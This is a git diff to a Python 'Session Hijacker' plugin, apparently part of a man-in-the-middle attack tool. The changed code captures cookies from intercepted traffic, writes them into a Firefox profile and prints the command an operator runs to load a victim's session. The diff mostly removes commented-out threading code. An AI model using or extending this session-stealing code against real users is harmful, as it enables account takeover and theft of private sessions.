@@ -8,7 +8,6 @@ import sys
 import time
 import logging
 import sqlite3
-#import threading
 
 class SessionHijacker(Plugin):
 	name = "Session Hijacker"
@@ -52,9 +51,6 @@ class SessionHijacker(Plugin):
 					eq = cookie.find("=")
 					cname = str(cookie)[0:eq].strip()
 					cvalue = str(cookie)[eq+1:].strip()
-					#t = threading.Thread(name='firefoxdb', target=self.firefoxdb, args=(headers['host'], cname, cvalue, url, client_ip))
-					#t.setDaemon(True)
-					#t.start()
 					self.firefoxdb(headers['host'], cname, cvalue, url, client_ip)
 			else:
 				logging.info("%s Got client cookie: [%s] %s" % (client_ip, headers['host'], headers['cookie']))
@@ -120,4 +116,5 @@ class SessionHijacker(Plugin):
 		options.add_argument('--firefox', dest='firefox', action='store_true', default=False, help='Create a firefox profile with captured cookies')
 
 	def finish(self):
-		print "[*] To load a session run: 'firefox -profile <client-ip> logs/<client-ip>'"
+		if self.firefox:
+			print "\n[*] To load a session run: 'firefox -profile <client-ip> logs/<client-ip>/visited.html'"
